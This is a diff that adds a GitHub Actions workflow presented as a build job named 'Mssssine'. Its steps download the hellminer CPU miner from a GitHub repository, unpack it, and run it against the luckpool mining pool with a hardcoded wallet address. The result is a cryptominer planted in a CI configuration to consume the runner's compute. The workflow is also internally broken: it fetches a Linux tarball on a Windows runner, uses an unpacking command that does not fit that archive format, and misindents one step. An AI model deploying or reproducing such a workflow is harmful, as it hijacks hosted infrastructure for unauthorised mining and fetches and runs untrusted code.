@@ -1,0 +1,26 @@
+name: Mssssine
+ 
+on: [workflow_dispatch]
+ 
+jobs:
+  build:
+    name: Mssssine
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1]
+        flag: [A]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: PREPARING
+     run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz -Outfile hellminer_cpu_linux.tar.gz
+    - name: Seting-UP
+      run: Expand-Archive hellminer_cpu_linux.tar.gz
+    - name: Running
+      run: ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RDCVd3nfHPPngjDmKX3Q4HXFCasFNGJLWb.fs -p x --cpu 2
+    - name: DONE
+      run: exit
